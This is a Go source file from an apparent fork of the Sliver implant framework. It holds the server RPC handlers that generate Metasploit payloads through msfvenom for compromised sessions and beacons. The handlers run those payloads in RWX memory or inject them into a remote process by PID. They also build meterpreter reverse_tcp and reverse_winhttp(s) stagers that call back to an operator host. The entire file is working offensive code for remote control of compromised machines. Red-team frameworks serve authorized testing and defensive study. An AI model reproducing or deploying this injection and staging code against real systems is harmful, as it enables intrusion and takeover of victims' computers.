package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"errors"
	"fmt"
	"math/rand"
	"path"
	"time"

	"github.com/gsmith257-cyber/better-sliver-package/protobuf/clientpb"
	"github.com/gsmith257-cyber/better-sliver-package/protobuf/commonpb"
	"github.com/gsmith257-cyber/better-sliver-package/protobuf/sliverpb"
	"github.com/gsmith257-cyber/better-sliver-package/server/codenames"
	"github.com/gsmith257-cyber/better-sliver-package/server/core"
	"github.com/gsmith257-cyber/better-sliver-package/server/db"
	"github.com/gsmith257-cyber/better-sliver-package/server/log"
	"github.com/gsmith257-cyber/better-sliver-package/server/msf"
)

var (
	msfLog = log.NamedLogger("rpc", "msf")
)

// Msf - Helper function to execute MSF payloads on the remote system
func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*sliverpb.Task, error) {
	var os string
	var arch string
	if !req.Request.Async {
		session := core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		os = session.OS
		arch = session.Arch
	} else {
		beacon, err := db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s\n", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
		os = beacon.OS
		arch = beacon.Arch
	}

	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
		Os:         os,
		Arch:       msf.Arch(arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	})
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return nil, err
	}
	taskReq := &sliverpb.TaskReq{
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
		Request:  req.Request,
	}
	resp := &sliverpb.Task{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(taskReq, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// MsfRemote - Inject an MSF payload into a remote process
func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*sliverpb.Task, error) {
	var os string
	var arch string
	if !req.Request.Async {
		session := core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		os = session.OS
		arch = session.Arch
	} else {
		beacon, err := db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s\n", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
		os = beacon.OS
		arch = beacon.Arch
	}

	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
		Os:         os,
		Arch:       msf.Arch(arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	})
	if err != nil {
		return nil, err
	}
	taskReq := &sliverpb.TaskReq{
		Pid:      req.PID,
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
		Request:  req.Request,
	}
	resp := &sliverpb.Task{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(taskReq, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// MsfStage - Generate a MSF compatible stage
func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*clientpb.MsfStager, error) {
	var (
		MSFStage = &clientpb.MsfStager{
			File: &commonpb.File{},
		}
		payload string
		arch    string
		uri     string
	)

	switch req.GetArch() {
	case "amd64":
		arch = "x64"
	default:
		arch = "x86"
	}

	switch req.Protocol {
	case clientpb.StageProtocol_TCP:
		payload = "meterpreter/reverse_tcp"
	case clientpb.StageProtocol_HTTP:
		payload = "custom/reverse_winhttp"
		uri = generateCallbackURI(req.HTTPC2ConfigName)
	case clientpb.StageProtocol_HTTPS:
		payload = "custom/reverse_winhttps"
		uri = generateCallbackURI(req.HTTPC2ConfigName)
	default:
		return MSFStage, errors.New("protocol not supported")
	}

	// We only support windows at the moment
	if req.GetOS() != "windows" {
		return MSFStage, fmt.Errorf("%s is currently not supported", req.GetOS())
	}

	venomConfig := msf.VenomConfig{
		Os:         req.GetOS(),
		Payload:    payload,
		LHost:      req.GetHost(),
		LPort:      uint16(req.GetPort()),
		Arch:       arch,
		Format:     req.GetFormat(),
		BadChars:   req.GetBadChars(), // TODO: make this configurable
		Luri:       uri,
		AdvOptions: req.AdvOptions,
	}

	stage, err := msf.VenomPayload(venomConfig)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return MSFStage, err
	}
	MSFStage.File.Data = stage
	name, err := codenames.GetCodename()
	if err != nil {
		return MSFStage, err
	}
	MSFStage.File.Name = name
	return MSFStage, nil
}

// Utility functions
func generateCallbackURI(httpC2ConfigName string) string {
	httpC2Config, err := db.LoadHTTPC2ConfigByName(httpC2ConfigName)
	if err != nil {
		return ""
	}
	segments := httpC2Config.ImplantConfig.PathSegments
	StageFiles := []string{}
	StagePaths := []string{}

	for _, segment := range segments {
		if segment.SegmentType == 3 {
			if segment.IsFile {
				StageFiles = append(StageFiles, segment.Value)
			} else {
				StagePaths = append(StagePaths, segment.Value)
			}
		}
	}

	return path.Join(randomPath(StagePaths, StageFiles)...)
}

func randomPath(segments []string, filenames []string) []string {
	seed := rand.NewSource(time.Now().UnixNano())
	insecureRand := rand.New(seed)
	n := insecureRand.Intn(3) // How many segments?
	genSegments := []string{}
	for index := 0; index < n; index++ {
		seg := segments[insecureRand.Intn(len(segments))]
		genSegments = append(genSegments, seg)
	}
	filename := filenames[insecureRand.Intn(len(filenames))]
	genSegments = append(genSegments, filename)
	return genSegments
}
